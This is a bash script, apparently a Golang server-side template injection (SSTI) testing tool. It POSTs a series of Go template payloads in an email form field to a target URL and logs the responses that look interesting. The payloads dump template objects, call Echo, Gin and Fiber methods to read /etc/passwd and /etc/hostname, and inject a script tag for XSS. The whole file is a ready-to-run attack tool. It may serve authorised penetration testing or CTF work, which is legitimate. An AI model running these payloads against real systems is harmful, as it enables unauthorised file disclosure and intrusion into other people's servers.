#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if target URL was provided
if [ $# -eq 0 ]; then
    echo -e "${RED}Error: No target URL provided${NC}"
    echo "Usage: $0 <target_url>"
    exit 1
fi

TARGET_URL=$1
OUTPUT_DIR="ssti_results_$(date +%Y%m%d_%H%M%S)"
LOGFILE="$OUTPUT_DIR/ssti_test.log"

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Function to URL encode strings
urlencode() {
    python3 -c "import urllib.parse; print(urllib.parse.quote('''$1'''))"
}

# Function to log messages both to console and file
log() {
    echo -e "$1" | tee -a "$LOGFILE"
}

# Function to test a single payload
test_payload() {
    local payload="$1"
    local description="$2"
    local category="$3"
    local encoded_payload=$(urlencode "$payload")
    
    log "\n${BLUE}Testing [$category]: $description${NC}"
    log "Payload: $payload"
    
    # Save response headers and body
    local response_file="$OUTPUT_DIR/response_${category// /_}_$(date +%s).txt"
    local start_time=$(date +%s.%N)
    
    # Make the request
    curl -s -X POST \
         -H "Content-Type: application/x-www-form-urlencoded" \
         -d "email=$encoded_payload&password=test123" \
         -D "$response_file.headers" \
         "$TARGET_URL" > "$response_file.body" 2>/dev/null
    
    local end_time=$(date +%s.%N)
    local response_time=$(echo "$end_time - $start_time" | bc)
    
    # Check response for interesting patterns
    local status_code=$(grep "HTTP/" "$response_file.headers" | awk '{print $2}')
    local content_length=$(wc -c < "$response_file.body")
    local interesting=false
    local reasons=""
    
    # Look for error messages
    if grep -q -i "template:\|golang\|runtime error\|panic:" "$response_file.body"; then
        interesting=true
        reasons+="Found error messages in response. "
    fi
    
    # Check status code
    if [ "$status_code" != "200" ]; then
        interesting=true
        reasons+="Non-200 status code ($status_code). "
    fi
    
    # Check response time
    if (( $(echo "$response_time > 2.0" | bc -l) )); then
        interesting=true
        reasons+="Long response time ($response_time seconds). "
    fi
    
    # Check for framework headers
    if grep -q -i "x-powered-by\|server:\|x-framework:" "$response_file.headers"; then
        interesting=true
        reasons+="Found framework-specific headers. "
    fi
    
    # If response was interesting, save details
    if [ "$interesting" = true ]; then
        log "${GREEN}Found interesting response!${NC}"
        log "Status Code: $status_code"
        log "Response Length: $content_length bytes"
        log "Response Time: $response_time seconds"
        log "Reasons: $reasons"
        log "Response saved to: $response_file.body"
        log "Headers saved to: $response_file.headers"
    else
        # Clean up files if not interesting
        rm "$response_file.body" "$response_file.headers"
    fi
}

# Print banner
log "${BLUE}=================================${NC}"
log "${BLUE}Golang SSTI Testing Tool${NC}"
log "${BLUE}Target: $TARGET_URL${NC}"
log "${BLUE}Start Time: $(date)${NC}"
log "${BLUE}=================================${NC}"

# Basic Detection Payloads
test_payload "{{.}}" "Basic object dump" "Basic"
test_payload "test@{{.}}.com" "Basic in email" "Basic"
test_payload "{{.Email}}" "Email property" "Basic"
test_payload "test@{{.Email}}.com" "Email in address" "Basic"

# Method Exploration
test_payload "test@{{.String}}.com" "String method" "Methods"
test_payload "test@{{.File \"/etc/passwd\"}}.com" "File read attempt" "Methods"
test_payload "test@{{.ModifyEmail}}.com" "Email modification" "Methods"

# Object Traversal
test_payload "{{.Context}}" "Context object" "Traversal"
test_payload "test@{{.Context}}.com" "Context in email" "Traversal"
test_payload "test@{{.Request}}.com" "Request object" "Traversal"

# Echo Framework
test_payload "test@{{.File \"/etc/passwd\"}}.com" "Echo file read" "Echo"
test_payload "test@{{.Attachment \"/etc/passwd\" \"passwd\"}}.com" "Echo attachment" "Echo"
test_payload "test@{{.Inline \"/etc/passwd\" \"passwd\"}}.com" "Echo inline" "Echo"

# Gin Framework
test_payload "test@{{.Writer.WriteString \"<script>alert(1)</script>\"}}.com" "Gin XSS" "Gin"

# Fiber Framework
test_payload "test@{{.Response.SendFile \"/etc/hostname\"}}.com" "Fiber file read" "Fiber"

# Advanced Techniques
test_payload "test@{{\$x:=.Echo.Filesystem.Open \"/etc/passwd\"}}{{\$x.Read}}.com" "Advanced file read" "Advanced"
test_payload "test@{{.Stream 200 \"text/plain\" (.File \"/etc/passwd\")}}.com" "Stream file" "Advanced"

# Print summary
log "\n${BLUE}=================================${NC}"
log "${BLUE}Testing Complete${NC}"
log "${BLUE}Results saved in: $OUTPUT_DIR${NC}"
log "${BLUE}End Time: $(date)${NC}"
log "${BLUE}=================================${NC}"

# Show interesting findings count
interesting_count=$(find "$OUTPUT_DIR" -name "response_*.body" | wc -l)
log "\n${GREEN}Found $interesting_count interesting responses${NC}"
if [ $interesting_count -gt 0 ]; then
    log "Check $OUTPUT_DIR for detailed responses"
fi